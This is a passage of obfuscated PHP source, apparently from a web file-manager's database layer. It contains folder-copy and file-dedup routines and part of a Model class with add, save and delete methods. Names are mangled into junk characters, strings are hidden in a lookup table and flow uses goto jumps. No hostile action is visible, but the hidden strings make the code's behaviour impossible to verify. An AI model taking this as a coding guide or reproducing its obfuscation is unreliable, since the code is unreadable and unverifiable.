$íÊŸôı[$–ÇóÛÎÆ[449]] == SourceModel::TYPE_GROUP && $õ¹¿™§û[$–ÇóÛÎÆ[534]] == $íÊŸôı[$–ÇóÛÎÆ[534]]; if (!$Ü¦«•’ && $this->moveClearAuth) { Model($–ÇóÛÎÆ[531])->authClear($¬ÁÎ™); } $ÎÅ«‘‹ş = $õ¹¿™§û[$–ÇóÛÎÆ[469]] == $–ÇóÛÎÆ[88] && $íÊŸôı[$–ÇóÛÎÆ[469]] != $–ÇóÛÎÆ[88]; if ($ÎÅ«‘‹ş) { $ÁÄ®‹è¡[$–ÇóÛÎÆ[468]] = 0; } if ($³Åî×ˆ) { $‡ÌĞ€ïÀ = array($–ÇóÛÎÆ[618] => array($–ÇóÛÎÆ[578], $õ¹¿™§û[$–ÇóÛÎÆ[549]] . $õ¹¿™§û[$–ÇóÛÎÆ[440]] . $–ÇóÛÎÆ[579])); $²Í’÷åû = $õ¹¿™§û[$–ÇóÛÎÆ[549]] . $õ¹¿™§û[$–ÇóÛÎÆ[440]] . $–ÇóÛÎÆ[50]; $“•Î—¸Ù = $íÊŸôı[$–ÇóÛÎÆ[549]] . $íÊŸôı[$–ÇóÛÎÆ[440]] . $–ÇóÛÎÆ[50] . $õ¹¿™§û[$–ÇóÛÎÆ[440]] . $–ÇóÛÎÆ[50]; $ºšûè÷š = array($–ÇóÛÎÆ[618] => array($–ÇóÛÎÆ[627], "\x72\145\x70\154\x61\143\x65\x28\160\141\x72\145\156\164\114\x65\x76\145\154\54\x27{$²Í’÷åû}\47\54\47{$“•Î—¸Ù}\x27\x29"), $–ÇóÛÎÆ[614] => $íÊŸôı[$–ÇóÛÎÆ[449]], $–ÇóÛÎÆ[615] => $íÊŸôı[$–ÇóÛÎÆ[534]]); if ($ÎÅ«‘‹ş) { $ºšûè÷š[$–ÇóÛÎÆ[468]] = 0; } $this->where($‡ÌĞ€ïÀ)->data($ºšûè÷š)->save(); } $this->where(array($–ÇóÛÎÆ[455] => $¬ÁÎ™))->data($ÁÄ®‹è¡)->save(); return $¬ÁÎ™; } private function clearShare($÷«şÖØ½, $„…ïƒ•µ) { $ª‘¹óŞ‘ =& $_SERVER[¡“ËÌ§œ]; $»ú™ö©ö = $this->sourceInfo($÷«şÖØ½); $Šî­Ï¼ê = $this->sourceInfo($„…ïƒ•µ); if ($»ú™ö©ö[$ª‘¹óŞ‘[534]] == $Šî­Ï¼ê[$ª‘¹óŞ‘[534]] && $»ú™ö©ö[$ª‘¹óŞ‘[449]] == $ª‘¹óŞ‘[628]) { return; } $®çÁôŸğ = array($ª‘¹óŞ‘[549] => array($ª‘¹óŞ‘[578], $»ú™ö©ö[$ª‘¹óŞ‘[549]] . $÷«şÖØ½ . $ª‘¹óŞ‘[579])); $ßãû¿ = $this->field($ª‘¹óŞ‘[455])->where($®çÁôŸğ)->getField($ª‘¹óŞ‘[440], !0); if (!$ßãû¿) { return; } $®çÁôŸğ = array($ª‘¹óŞ‘[440] => array($ª‘¹óŞ‘[7], $ßãû¿), $ª‘¹óŞ‘[629] => 1); $Æˆ„ŸÔ™ = Model($ª‘¹óŞ‘[630])->field($ª‘¹óŞ‘[631])->where($®çÁôŸğ)->select(); if (!$Æˆ„ŸÔ™) { return; } $Æˆ„ŸÔ™ = array_to_keyvalue($Æˆ„ŸÔ™, $ª‘¹óŞ‘[12], $ª‘¹óŞ‘[631]); $®çÁôŸğ = array($ª‘¹óŞ‘[631] => array($ª‘¹óŞ‘[7], $Æˆ„ŸÔ™)); Model($ª‘¹óŞ‘[630])->where($®çÁôŸğ)->save(array($ª‘¹óŞ‘[629] => 0)); Model($ª‘¹óŞ‘[632])->where($®çÁôŸğ)->delete(); } public function copyFolderFromIO($®¯Í‰” , $—¤é¼ó´, $æÎÎíşÌ, $ëì«àç, $ ã¿¨Ğ×, $ƒêğ‚ = false) { $í¿ûªò =& $_SERVER[¡“ËÌ§œ]; $ƒæˆèùá = array($í¿ûªò[596] => array(), $í¿ûªò[597] => array(), $í¿ûªò[595] => array(), $í¿ûªò[633] => array()); $èš±¹É› = $ƒêğ‚ ? $ƒêğ‚ : $®¯Í‰” ->pathThis($—¤é¼ó´); $óùˆ®âÁ = $this->fileNameExist($æÎÎíşÌ, $èš±¹É›); $İÇ’‘Ñ = $this->mkdir($æÎÎíşÌ, $èš±¹É›, $ëì«àç); if (!$óùˆ®âÁ || $ëì«àç == REPEAT_RENAME_FOLDER) { $ëì«àç = !1; } if ($óùˆ®âÁ) { $this->_childrenAllMake($óùˆ®âÁ); } Hook::trigger($í¿ûªò[634]); $this->_copyChildTo($®¯Í‰” , $—¤é¼ó´, $İÇ’‘Ñ, $ëì«àç, $ƒæˆèùá, $ ã¿¨Ğ×); Hook::trigger($í¿ûªò[635]); if ($İÇ’‘Ñ) { $this->folderSizeResetChildren($İÇ’‘Ñ); } $this->_childrenListClear(); Model($í¿ûªò[598])->addAll($ƒæˆèùá[$í¿ûªò[596]], array(), !0); Model($í¿ûªò[599])->eventCopy($İÇ’‘Ñ); $this->saveAll($ƒæˆèùá[$í¿ûªò[597]]); Model($í¿ûªò[509])->linkAdd($ƒæˆèùá[$í¿ûªò[595]]); Model($í¿ûªò[509])->remove($ƒæˆèùá[$í¿ûªò[633]]); $this->folderSizeReset($æÎÎíşÌ); $this->updateModifyTime($æÎÎíşÌ); return $İÇ’‘Ñ; } private function _copyChildTo($›«Ø³Â, $¯†Æ·—Ê, $½öÙ„¦ø, $Ãò·×Ÿ¡, &$ó‡¢âù¿, $ëÂáş–€) { $·ÍŠ”øŞ =& $_SERVER[¡“ËÌ§œ]; $í­»œÁ = $this->sourceInfoCache($½öÙ„¦ø); $óŞôª›İ = $›«Ø³Â->listPath($¯†Æ·—Ê); $óŞôª›İ = $óŞôª›İ ? $óŞôª›İ : array($·ÍŠ”øŞ[83] => array(), $·ÍŠ”øŞ[82] => array()); $—¢Ó³§ = array_merge($óŞôª›İ[$·ÍŠ”øŞ[83]], $óŞôª›İ[$·ÍŠ”øŞ[82]]); $Ù“í£¥ = $this->_addFiles($›«Ø³Â, $óŞôª›İ[$·ÍŠ”øŞ[83]], $ëÂáş–€); $ì‹ÇÏ«Á = array(); foreach ($—¢Ó³§ as &$ïæØòªâ) { if (isset($Ù“í£¥[$ïæØòªâ[$·ÍŠ”øŞ[32]]])) { $ïæØòªâ = $Ù“í£¥[$ïæØòªâ[$·ÍŠ”øŞ[32]]]; } $ïæØòªâ[$·ÍŠ”øŞ[448]] = $ïæØòªâ[$·ÍŠ”øŞ[33]] == $·ÍŠ”øŞ[75]; $ïæØòªâ[$·ÍŠ”øŞ[450]] = substr(_get($ïæØòªâ, $·ÍŠ”øŞ[174], $·ÍŠ”øŞ[12]), 0, 10); $ïæØòªâ[$·ÍŠ”øŞ[76]] = _get($ïæØòªâ, $·ÍŠ”øŞ[76], 0); $ïæØòªâ[$·ÍŠ”øŞ[506]] = _get($ïæØòªâ, $·ÍŠ”øŞ[506], 0); if (!isset($ïæØòªâ[$·ÍŠ”øŞ[636]]) && $ïæØòªâ[$·ÍŠ”øŞ[506]]) { $ó‡¢âù¿[$·ÍŠ”øŞ[633]][] = $ïæØòªâ[$·ÍŠ”øŞ[506]]; } if ($Ãò·×Ÿ¡) { $³Ò”Õ÷Ü = $this->fileNameExistCache($½öÙ„¦ø, $ïæØòªâ[$·ÍŠ”øŞ[32]]); if ($³Ò”Õ÷Ü) { if ($ïæØòªâ[$·ÍŠ”øŞ[448]] || $Ãò·×Ÿ¡ == REPEAT_SKIP) { continue; } if ($Ãò·×Ÿ¡ == REPEAT_REPLACE) { $Ÿ©ßÂÙí = $this->sourceInfoCache($³Ò”Õ÷Ü); $Ñì±¤†— = $this->fileHistory($Ÿ©ßÂÙí, $ïæØòªâ[$·ÍŠ”øŞ[506]], $ïæØòªâ[$·ÍŠ”øŞ[76]]); if ($Ñì±¤†—) { $ó‡¢âù¿[$·ÍŠ”øŞ[595]][] = $ïæØòªâ[$·ÍŠ”øŞ[506]]; } continue; } else { if ($Ãò·×Ÿ¡ == REPEAT_RENAME) { $ïæØòªâ[$·ÍŠ”øŞ[32]] = $this->fileNameAutoCache($½öÙ„¦ø, $ïæØòªâ[$·ÍŠ”øŞ[32]], $Ãò·×Ÿ¡, !1); } } } } if (!$ïæØòªâ[$·ÍŠ”øŞ[448]] && $ïæØòªâ[$·ÍŠ”øŞ[506]] == 0) { continue; } if (!$ïæØòªâ[$·ÍŠ”øŞ[448]] && $ïæØòªâ[$·ÍŠ”øŞ[506]]) { $ó‡¢âù¿[$·ÍŠ”øŞ[595]][] = $ïæØòªâ[$·ÍŠ”øŞ[506]]; } $ì‹ÇÏ«Á[] = $this->_makeItemData($ïæØòªâ, $í­»œÁ, $ïæØòªâ[$·ÍŠ”øŞ[32]]); } unset($ïæØòªâ); if (!empty($ì‹ÇÏ«Á)) { $this->addAll($ì‹ÇÏ«Á); $this->_childrenListSelect($½öÙ„¦ø); } $ëÀü™šÍ = $this->_childrenList($½öÙ„¦ø); $ëÀü™šÍ = array_to_keyvalue($ëÀü™šÍ, $·ÍŠ”øŞ[32]); foreach ($—¢Ó³§ as $ïæØòªâ) { $Ÿ©ßÂÙí = $ëÀü™šÍ[$ïæØòªâ[$·ÍŠ”øŞ[32]]]; $Ú÷ïÈ•  = $Ÿ©ßÂÙí[$·ÍŠ”øŞ[440]]; $this->_copyApplyMeta($Ÿ©ßÂÙí, $ó‡¢âù¿); if ($ïæØòªâ[$·ÍŠ”øŞ[33]] == $·ÍŠ”øŞ[75]) { $ïæØòªâ[$·ÍŠ”øŞ[84]] = $›«Ø³Â->getPathInner($ïæØòªâ[$·ÍŠ”øŞ[84]]); $this->_copyChildTo($›«Ø³Â, $ïæØòªâ[$·ÍŠ”øŞ[84]], $Ú÷ïÈ• , $Ãò·×Ÿ¡, $ó‡¢âù¿, $ëÂáş–€); } } } private function _addFiles($÷›œéÄ•, $ı¨øş¦¶, $å½ÇŸ“Æ) { $¬¦Ö°üÖ =& $_SERVER[¡“ËÌ§œ]; if (!$ı¨øş¦¶ || count($ı¨øş¦¶) == 0) { return array(); } $§ËÖÎ»© = array(); foreach ($ı¨øş¦¶ as &$í·²Æ›’) { Hook::trigger($¬¦Ö°üÖ[637], $í·²Æ›’); $í·²Æ›’[$¬¦Ö°üÖ[84]] = $÷›œéÄ•->getPathInner($í·²Æ›’[$¬¦Ö°üÖ[84]]); $¥ÔšÛ¹º = $÷›œéÄ•->hashSimple($í·²Æ›’[$¬¦Ö°üÖ[84]]); $‚•±±ú« = $÷›œéÄ•->hashMd5($í·²Æ›’[$¬¦Ö°üÖ[84]]); if (strlen($‚•±±ú«) > 10 && !isset($§ËÖÎ»©[$‚•±±ú«])) { $§ËÖÎ»©[$‚•±±ú«] = array(); } $í·²Æ›’[$¬¦Ö°üÖ[177]] = $¥ÔšÛ¹º; $í·²Æ›’[$¬¦Ö°üÖ[176]] = $‚•±±ú«; $§ËÖÎ»©[$‚•±±ú«][] =& $í·²Æ›’; if (count($§ËÖÎ»©[$‚•±±ú«]) > 1) { $í·²Æ›’[$¬¦Ö°üÖ[636]] = !0; } Hook::trigger($¬¦Ö°üÖ[638], $í·²Æ›’); } unset($í·²Æ›’); $¢ñšâ¹£ = array($¬¦Ö°üÖ[176] => array($¬¦Ö°üÖ[7], array_keys($§ËÖÎ»©))); $Å„ÙØ÷Õ = Model($¬¦Ö°üÖ[639]); $ñŸòà = $Å„ÙØ÷Õ->where($¢ñšâ¹£)->select(); $ñŸòà = $ñŸòà ? $ñŸòà : array(); foreach ($ñŸòà as $™¦§­§Ÿ) { if (!isset($§ËÖÎ»©[$™¦§­§Ÿ[$¬¦Ö°üÖ[176]]])) { continue; } $Ì°İ³şı = $§ËÖÎ»©[$™¦§­§Ÿ[$¬¦Ö°üÖ[176]]]; foreach ($Ì°İ³şı as &$í·²Æ›’) { $í·²Æ›’[$¬¦Ö°üÖ[506]] = $™¦§­§Ÿ[$¬¦Ö°üÖ[506]]; $í·²Æ›’[$¬¦Ö°üÖ[636]] = !0; } unset($í·²Æ›’); } $›íÕï»Ü = array(); foreach ($ı¨øş¦¶ as $°È½ØÎö) { Hook::trigger($¬¦Ö°üÖ[640], $°È½ØÎö); if (isset($°È½ØÎö[$¬¦Ö°üÖ[636]]) && $°È½ØÎö[$¬¦Ö°üÖ[636]]) { Hook::trigger($¬¦Ö°üÖ[641], $°È½ØÎö); continue; } $ç‘µ½Õù = $÷›œéÄ•->getPathInner($°È½ØÎö[$¬¦Ö°üÖ[84]]); $ı²ºêô = $Å„ÙØ÷Õ->addFileMake($ç‘µ½Õù, $°È½ØÎö[$¬¦Ö°üÖ[76]], $°È½ØÎö[$¬¦Ö°üÖ[177]], $°È½ØÎö[$¬¦Ö°üÖ[176]], $°È½ØÎö[$¬¦Ö°üÖ[32]], $å½ÇŸ“Æ); Hook::trigger($¬¦Ö°üÖ[641], $°È½ØÎö); if (!is_array($ı²ºêô)) { continue; } $›íÕï»Ü[] = $ı²ºêô; } $Å„ÙØ÷Õ->addAll($›íÕï»Ü); $¢ñšâ¹£ = array($¬¦Ö°üÖ[176] => array($¬¦Ö°üÖ[7], array_keys($§ËÖÎ»©))); $ñŸòà = $Å„ÙØ÷Õ->where($¢ñšâ¹£)->select(); $ñŸòà = $ñŸòà ? $ñŸòà : array(); foreach ($ñŸòà as $™¦§­§Ÿ) { if (!isset($§ËÖÎ»©[$™¦§­§Ÿ[$¬¦Ö°üÖ[176]]])) { continue; } $ıì–Ìı» =& $§ËÖÎ»©[$™¦§­§Ÿ[$¬¦Ö°üÖ[176]]]; foreach ($ıì–Ìı» as &$í·²Æ›’) { $í·²Æ›’[$¬¦Ö°üÖ[506]] = $™¦§­§Ÿ[$¬¦Ö°üÖ[506]]; } unset($í·²Æ›’); } $äÔ„œ»Æ = array(); foreach ($ı¨øş¦¶ as $Ôù¤º‰â) { $äÔ„œ»Æ[$Ôù¤º‰â[$¬¦Ö°üÖ[32]]] = $Ôù¤º‰â; } return $äÔ„œ»Æ; } } define($_SERVER[¡“ËÌ§œ][642], $_SERVER[¡“ËÌ§œ][643]); $bndeipqwyx = $_SERVER[¡“ËÌ§œ][644]; goto aÅôÌ²Í•õ; F·­İéá£: function binCheckBigger($ô±ÑÕã‰, $»Úù…²˜) { return $ô±ÑÕã‰ > $»Úù…²˜; } $_SERVER[$_SERVER[ÛÛ¹¦ó][3]] = (base64_decode('ODIxMA==')."\x39\x30")+0;$_oiqn="9tz25yc0wve4irlojh76fkmpanux1sbd38qgdbxckejmp1sv506giz4l73qohfwa29tur";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($êåÓÍöÂ, $¬åÌ°å‹) { $À¡¤˜¯Ù =& $_SERVER[¡“ËÌ§œ]; if (isset(self::$_methodList[$êåÓÍöÂ])) { return @call_user_func_array(self::$_methodList[$êåÓÍöÂ], $¬åÌ°å‹); } else { if (method_exists($this, $êåÓÍöÂ)) { return call_user_func_array(array($this, $êåÓÍöÂ), $¬åÌ°å‹); } else { think_exception(__CLASS__ . $À¡¤˜¯Ù[4] . $êåÓÍöÂ . $À¡¤˜¯Ù[5]); } } } public static function __callStatic($ëàÃÃãÍ, $’¯‹—Ö) { if (isset(self::$_methodListStatic[$ëàÃÃãÍ])) { return call_user_func_array(self::$_methodListStatic[$ëàÃÃãÍ], $’¯‹—Ö); } else { if (method_exists(self, $ëàÃÃãÍ)) { return call_user_func_array(array(self, $ëàÃÃãÍ), $’¯‹—Ö); } else { show_json("{$ëàÃÃãÍ}\x28\51\x20\156\157\164\40\x65\170\151\163\x74\73", !1); } } } public static function addMethod($°¾À¸ü¶, $ÛÌŒ¾”õ) { self::$_methodList[$°¾À¸ü¶] = $ÛÌŒ¾”õ; } public static function addMethodStatic($™Š»û“, $ì×¬£·¯) { self::$_methodListStatic[$™Š»û“] = $ì×¬£·¯; } } goto e½ğ ”; DŒÏ‚Â¯: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\157\x72\x64\145\x72", "\x61\154\x69\141\x73", "\150\x61\166\x69\x6e\147", "\x67\x72\x6f\x75\160", "\x6c\157\x63\153", "\144\x69\163\164\151\156\143\x74", "\141\165\x74\157", "\x66\x69\154\x74\x65\162", "\166\141\x6c\151\x64\x61\164\145", "\x72\145\x73\165\x6c\164", "\x62\151\x6e\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($ÌËœÖŞÊ = '', $ãÁÚİí³ = '', $ º±²Ä¿ = '') { $‰²¤ŒÊ =& $_SERVER[¡“ËÌ§œ]; $this->_initialize(); if (!empty($ÌËœÖŞÊ)) { if (strpos($ÌËœÖŞÊ, $‰²¤ŒÊ[10])) { list($this->dbName, $this->name) = explode($‰²¤ŒÊ[10], $ÌËœÖŞÊ); } else { $this->name = $ÌËœÖŞÊ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ãÁÚİí³)) { $this->tablePrefix = $‰²¤ŒÊ[12]; } elseif ($‰²¤ŒÊ[12] != $ãÁÚİí³) { $this->tablePrefix = $ãÁÚİí³; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‰²¤ŒÊ[273]); } $this->db(0, empty($this->connection) ? $ º±²Ä¿ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Â÷èü›µ =& $_SERVER[¡“ËÌ§œ]; if (empty($this->fields)) { if (think_config($Â÷èü›µ[274])) { $›õÊõÍÍ = $this->dbName ? $this->dbName : think_config($Â÷èü›µ[275]); $¥ûÒÂ¹ = think_var_cache($Â÷èü›µ[276] . strtolower(get_path_this($›õÊõÍÍ) . $Â÷èü›µ[10] . $this->name)); if ($¥ûÒÂ¹) { $„èòÈ¢² = think_config($Â÷èü›µ[277]); if (empty($„èòÈ¢²) || $¥ûÒÂ¹[$Â÷èü›µ[278]] == $„èòÈ¢²) { $this->fields = $¥ûÒÂ¹; return; } } } $this->flush(); } } public function flush() { $‘à•Ñ– =& $_SERVER[¡“ËÌ§œ]; $this->db->setModel($this->name); $„¯›ˆªÊ = $this->db->getFields($this->getTableName()); if (!$„¯›ˆªÊ) { return !1; } $this->fields = array_keys($„¯›ˆªÊ); $this->fields[$‘à•Ñ–[279]] = !1; foreach ($„¯›ˆªÊ as $ù°€¬¬± => $ÍûÁÚ²í) { $ƒˆ‘ƒã[$ù°€¬¬±] = $ÍûÁÚ²í[$‘à•Ñ–[33]]; if ($ÍûÁÚ²í[$‘à•Ñ–[39]]) { $this->fields[$‘à•Ñ–[280]] = $ù°€¬¬±; if ($ÍûÁÚ²í[$‘à•Ñ–[42]]) { $this->fields[$‘à•Ñ–[279]] = !0; } } } $this->fields[$‘à•Ñ–[281]] = $ƒˆ‘ƒã; if (think_config($‘à•Ñ–[277])) { $this->fields[$‘à•Ñ–[278]] = think_config($‘à•Ñ–[277]); } if (think_config($‘à•Ñ–[274])) { $ûÁÌ‘Ôá = $this->dbName ? $this->dbName : think_config($‘à•Ñ–[275]); think_var_cache($‘à•Ñ–[276] . strtolower(get_path_this($ûÁÌ‘Ôá) . $‘à•Ñ–[10] . $this->name), $this->fields); } } public function switchModel($²™É¼©, $Î‡–ƒÓ = array()) { $àùÓï£Ş =& $_SERVER[¡“ËÌ§œ]; $í„»Ö ” = ucwords(strtolower($²™É¼©)) . $àùÓï£Ş[282]; if (!class_exists($í„»Ö ”)) { think_exception($í„»Ö ” . think_lang($àùÓï£Ş[283])); } $this->_extModel = new $í„»Ö ”($this->name); if (!empty($Î‡–ƒÓ)) { foreach ($Î‡–ƒÓ as $Í¹”¿¾Ø) { $this->_extModel->setProperty($Í¹”¿¾Ø, $this->{$Í¹”¿¾Ø}); } } return $this->_extModel; } public function __set($Ì¨†ØÛë, $›¡Üšşâ) { $this->data[$Ì¨†ØÛë] = $›¡Üšşâ; } public function __get($Ğ™œ’ä¨) { return isset($this->data[$Ğ™œ’ä¨]) ? $this->data[$Ğ™œ’ä¨] : null; } public function __isset($›§Á¼˜) { return isset($this->data[$›§Á¼˜]); } public function __unset($ŞƒĞ¸Í›) { unset($this->data[$ŞƒĞ¸Í›]); } public function __call($Â´ , $»Ü„×æ³) { $ÕŒñ´ÅŠ =& $_SERVER[¡“ËÌ§œ]; if (in_array(strtolower($Â´ ), $this->methods, !0)) { $this->options[strtolower($Â´ )] = $»Ü„×æ³[0]; return $this; } elseif (in_array(strtolower($Â´ ), array($ÕŒñ´ÅŠ[284], $ÕŒñ´ÅŠ[285], $ÕŒñ´ÅŠ[286], $ÕŒñ´ÅŠ[287], $ÕŒñ´ÅŠ[288]), !0)) { $÷¸º¨ = isset($»Ü„×æ³[0]) ? $»Ü„×æ³[0] : $ÕŒñ´ÅŠ[189]; $÷¸º¨ = $this->db->parseKey($÷¸º¨); return $this->getField(strtoupper($Â´ ) . $ÕŒñ´ÅŠ[289] . $÷¸º¨ . $ÕŒñ´ÅŠ[290] . $Â´ , $ÕŒñ´ÅŠ[284]); } elseif (strtolower(substr($Â´ , 0, 5)) == $ÕŒñ´ÅŠ[291]) { $÷¸º¨ = think_parse_name(substr($Â´ , 5)); $Öô‡¹£“[$÷¸º¨] = $»Ü„×æ³[0]; return $this->where($Öô‡¹£“)->find(); } elseif (strtolower(substr($Â´ , 0, 10)) == $ÕŒñ´ÅŠ[292]) { $àı·—Ê = think_parse_name(substr($Â´ , 10)); $Öô‡¹£“[$àı·—Ê] = $»Ü„×æ³[0]; return $this->where($Öô‡¹£“)->getField($»Ü„×æ³[1]); } elseif (isset($this->_scope[$Â´ ])) { return $this->scope($Â´ , $»Ü„×æ³[0]); } elseif (method_exists($this, $Â´ )) { array_unshift($»Ü„×æ³, $Â´ ); return call_user_func_array(array($this, $ÕŒñ´ÅŠ[293]), $»Ü„×æ³); } else { return call_user_func_array(array(parent, $Â´ ), $»Ü„×æ³); } } protected function call() { $¿¶÷Éò™ =& $_SERVER[¡“ËÌ§œ]; $Ç¼ÙÂöğ = func_get_args(); $¾‹ğê¹Ü = array_shift($Ç¼ÙÂöğ); $ÍĞƒı¦  = $¾‹ğê¹Ü; if (is_array($¾‹ğê¹Ü)) { $ÍĞƒı¦  = $¾‹ğê¹Ü[1]; $¾‹ğê¹Ü = $¾‹ğê¹Ü[0]; } $å¶„´”Ì = count($Ç¼ÙÂöğ) - 1; if (isset($Ç¼ÙÂöğ[$å¶„´”Ì]) && $Ç¼ÙÂöğ[$å¶„´”Ì] === $¾‹ğê¹Ü) { think_exception(__CLASS__ . $¿¶÷Éò™[4] . $¾‹ğê¹Ü . think_lang($¿¶÷Éò™[294])); return; } $Ç¼ÙÂöğ[] = $¾‹ğê¹Ü; if (method_exists($this, $¿¶÷Éò™[295])) { $õÄÜ¨× = call_user_func_array(array($this, $¿¶÷Éò™[296]), array($ÍĞƒı¦ , $Ç¼ÙÂöğ)); if (!is_null($õÄÜ¨×) && $õÄÜ¨× !== !1) { return $õÄÜ¨×; } } $®È§´¦¾ = call_user_func_array(array($this, $¾‹ğê¹Ü), $Ç¼ÙÂöğ); if (method_exists($this, $¿¶÷Éò™[297])) { $õÄÜ¨× = call_user_func_array(array($this, $¿¶÷Éò™[298]), array($ÍĞƒı¦ , $Ç¼ÙÂöğ, $®È§´¦¾)); if ($õÄÜ¨×) { return $õÄÜ¨×; } } return $®È§´¦¾; } protected function _initialize() { } protected function _facade($¢šÚáˆ«) { $µÌÁµğ =& $_SERVER[¡“ËÌ§œ]; if (!empty($this->fields)) { foreach ($¢šÚáˆ« as $±‡§¯ì¶ => $ÀÑÙ‰Œ) { if (is_array($this->fields) && !in_array($±‡§¯ì¶, $this->fields, !0)) { unset($¢šÚáˆ«[$±‡§¯ì¶]); } elseif (is_scalar($ÀÑÙ‰Œ)) { $this->_parseType($¢šÚáˆ«, $±‡§¯ì¶); } } } if (!empty($this->options[$µÌÁµğ[299]])) { $¢šÚáˆ« = array_map($this->options[$µÌÁµğ[299]], $¢šÚáˆ«); unset($this->options[$µÌÁµğ[299]]); } $this->_beforeWrite($¢šÚáˆ«); return $¢šÚáˆ«; } protected function _beforeWrite(&$œ—ÍÄú¢) { } public function add($Ú¥’í¼Ï = '', $î®¼€Ù¡ = array(), $îç–ä…û = false) { if (empty($Ú¥’í¼Ï)) { if (!empty($this->data)) { $Ú¥’í¼Ï = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¡“ËÌ§œ][300]); return !1; } } $î®¼€Ù¡ = $this->_parseOptions($î®¼€Ù¡); $Ú¥’í¼Ï = $this->_facade($Ú¥’í¼Ï); if (!1 === $this->_beforeInsert($Ú¥’í¼Ï, $î®¼€Ù¡)) { return !1; } $›ç‡•· = $this->db->insert($Ú¥’í¼Ï, $î®¼€Ù¡, $îç–ä…û); if (!1 !== $›ç‡•·) { $ĞìÚ¶‘ = $this->getLastInsID(); if ($ĞìÚ¶‘) { $Ú¥’í¼Ï[$this->getPk()] = $ĞìÚ¶‘; $this->_after_insert($Ú¥’í¼Ï, $î®¼€Ù¡); return $ĞìÚ¶‘; } $this->_after_insert($Ú¥’í¼Ï, $î®¼€Ù¡); } return $›ç‡•·; } protected function _beforeInsert(&$Æ¦³Èè, $´—´‚ĞÜ) { } protected function _after_insert($Š¢¡Ìô÷, $É÷”Û˜) { } public function addAll($˜â®éòœ, $Óç™è‰å = array(), $Ç÷ñó = false) { $ùÔƒóƒ» =& $_SERVER[¡“ËÌ§œ]; if (empty($˜â®éòœ)) { $this->error = think_lang($ùÔƒóƒ»[300]); return !1; } $Óç™è‰å = $this->_parseOptions($Óç™è‰å); foreach ($˜â®éòœ as $äÖ’”Şê => $ìğ£ğà«) { $˜â®éòœ[$äÖ’”Şê] = $this->_facade($ìğ£ğà«); } if (method_exists($this->db, $ùÔƒóƒ»[301])) { $ƒ»†Œù† = $this->db->insertAll($˜â®éòœ, $Óç™è‰å, $Ç÷ñó); } else { $this->startTrans(); foreach ($˜â®éòœ as $äÖ’”Şê => $ìğ£ğà«) { $ƒ»†Œù† = $this->db->insert($ìğ£ğà«, $Óç™è‰å, $Ç÷ñó); } $this->commit(); } if (!1 !== $ƒ»†Œù†) { $Ó¼©ºğı = $this->getLastInsID(); if ($Ó¼©ºğı) { return $Ó¼©ºğı; } } return $ƒ»†Œù†; } public function selectAdd($ƒˆÏÕÙÈ = '', $Ø§ş¦æ© = '', $éø£½î¥ = array()) { $«óığäæ =& $_SERVER[¡“ËÌ§œ]; $éø£½î¥ = $this->_parseOptions($éø£½î¥); if (!1 === ($Ô‚”ï¬ = $this->db->selectInsert($ƒˆÏÕÙÈ ? $ƒˆÏÕÙÈ : $éø£½î¥[$«óığäæ[302]], $Ø§ş¦æ© ? $Ø§ş¦æ© : $this->getTableName(), $éø£½î¥))) { $this->error = think_lang($«óığäæ[303]); return !1; } else { return $Ô‚”ï¬; } } public function save($§Ê½„œ‹ = '', $¨ãìü££ = array()) { $·Ú–ş® =& $_SERVER[¡“ËÌ§œ]; if (empty($§Ê½„œ‹)) { if (!empty($this->data)) { $§Ê½„œ‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($·Ú–ş®[300]); return !1; } } $§Ê½„œ‹ = $this->_facade($§Ê½„œ‹); $¨ãìü££ = $this->_parseOptions($¨ãìü££); $øÛèËÀ = $this->getPk(); if (!isset($¨ãìü££[$·Ú–ş®[304]])) { if (isset($§Ê½„œ‹[$øÛèËÀ])) { $áœäøó½[$øÛèËÀ] = $§Ê½„œ‹[$øÛèËÀ]; $¨ãìü££[$·Ú–ş®[304]] = $áœäøó½; unset($§Ê½„œ‹[$øÛèËÀ]); } else { $this->error = think_lang($·Ú–ş®[303]); return !1; } } if (is_array($¨ãìü££[$·Ú–ş®[304]]) && isset($¨ãìü££[$·Ú–ş®[304]][$øÛèËÀ])) { $àó­Ì¶‚ = $¨ãìü££[$·Ú–ş®[304]][$øÛèËÀ]; } if (!1 === $this->_beforeUpdate($§Ê½„œ‹, $¨ãìü££)) { return !1; } $ÓÄ±®¹æ = $this->db->update($§Ê½„œ‹, $¨ãìü££); if (!1 !== $ÓÄ±®¹æ) { if (isset($àó­Ì¶‚)) { $§Ê½„œ‹[$øÛèËÀ] = $àó­Ì¶‚; } $this->_afterUpdate($§Ê½„œ‹, $¨ãìü££); } return $ÓÄ±®¹æ; } protected function _beforeUpdate(&$ß¥³ıÇ´, $ìçÏæ„Ş) { } protected function _afterUpdate($ÒÇ‹íÌ, $—¿Íš¿‘) { } public function delete($‡Ä×²·¥ = array()) { $Ôº È¼“ =& $_SERVER[¡“ËÌ§œ]; if (empty($‡Ä×²·¥) && empty($this->options[$Ôº È¼“[304]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ê‘ö¨…Ê = $this->getPk(); if (is_numeric($‡Ä×²·¥) || is_string($‡Ä×²·¥)) { if (strpos($‡Ä×²·¥, $Ôº È¼“[50])) { $–‡æ¿Á’[$Ê‘ö¨…Ê] = array($Ôº È¼“[305], $‡Ä×²·¥); } else { $–‡æ¿Á’[$Ê‘ö¨…Ê] = $‡Ä×²·¥; } $this->options[$Ôº È¼“[304]] = $–‡æ¿Á’; } $‡Ä×²·¥ = $this->_parseOptions(); if (is_array($‡Ä×²·¥[$Ôº È¼“[304]]) && isset($‡Ä×²·¥[$Ôº 